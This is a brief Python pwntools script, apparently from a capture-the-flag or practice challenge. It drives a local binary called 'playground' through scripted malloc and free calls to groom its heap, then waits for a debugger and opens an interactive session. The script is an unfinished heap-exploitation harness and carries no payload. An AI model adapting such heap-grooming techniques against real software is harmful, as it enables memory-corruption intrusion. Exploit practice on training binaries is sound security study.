from pwn import*
p = process('./playground')

l = []

# def
def malloc(size):
	p.sendlineafter('> ','malloc '+str(size))
	p.recvuntil('==> ')
	l.append(str(p.recv(8)))
	
def free(idx):
	print('[!] free '+l[idx])
	p.sendlineafter('> ','free '+l[idx])
	p.recvuntil('==> ok')
	


malloc(0x400)	# 0
malloc(0x20)	# 1
malloc(0x500)	# 2
malloc(0x20)	# 3
malloc(0x500)	# 4
malloc(0x20)	# 5
free(0)
free(2)
malloc(0x90)
free(4)
raw_input()
malloc(0x90)

print('complete !!!')

p.interactive()




